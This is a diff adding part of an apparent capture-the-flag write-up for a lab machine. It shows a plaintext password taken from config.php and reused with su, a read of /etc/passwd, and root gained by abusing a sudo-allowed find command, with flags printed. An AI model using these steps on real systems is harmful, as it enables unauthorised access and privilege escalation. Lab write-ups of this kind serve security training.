@@ -145,12 +145,79 @@
     python3 -c "import pty;pty.spawn('/bin/bash')"
 
 
+// Searching in the /var/www/html/login/ directory, found file config.php
+
+    www-data@base:/var/www/html/login$ cat config.php
+    cat config.php
+    <?php
+    $username = "admin";
+    $password = "thisisagoodpassword";
+    ...
+
+// we found user john in etc/passwd
+
+    www-data@base:/etc$ cat passwd
+    ......................................................
+    john:x:1000:1000:John:/home/john:/bin/bash
+    ................................................
+
+// Try connect johb user with password: hisisagoodpassword
+
+    www-data@base:/$ su john
+    su john
+    password: thisisagoodpassword
+
+    john@base:/$ id
+    uid=1000(john) gid=1000(john) groups=1000(john)
+    
+// It Worked! 
+
+// We got user flag!
+
+    john@base:~$ cat user.txt
+    cat user.txt
+    f54846c258f3b4612f78a819573d158e
 
 
+## ----Privilliges Escalation----
 
 
+// running sudo -l for checking which files we can run with root permission we got 'find'
 
-Access ID | Name | Email
-----------|------|-------
-34322 | admin | admin@megacorp.com
+
+    john@base:~$ sudo -l
+    sudo -l
+    [sudo] password for john: thisisagoodpassword
+
+    Matching Defaults entries for john on base:
+        env_reset, mail_badpass,
+        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+    User john may run the following commands on base:
+        (root : root) /usr/bin/find
+
+
+// lets abuse 'find' command for root privilleges 
+
+
+    john@base:~$ sudo find . -exec /bin/sh \; -quit
+    sudo find . -exec /bin/sh \; -quit
+    
+    # whoami
+    whoami
+    root
+
+
+// Lets promote root shell with python
+
+    # python3 -c "import pty;pty.spawn('/bin/bash')"
+    python3 -c "import pty;pty.spawn('/bin/bash')"
+    root@base:/home# 
+-----
+
+// We got root flag !
+
+    root@base:/root# cat root.txt
+    cat root.txt
+    51709519ea18.................
 
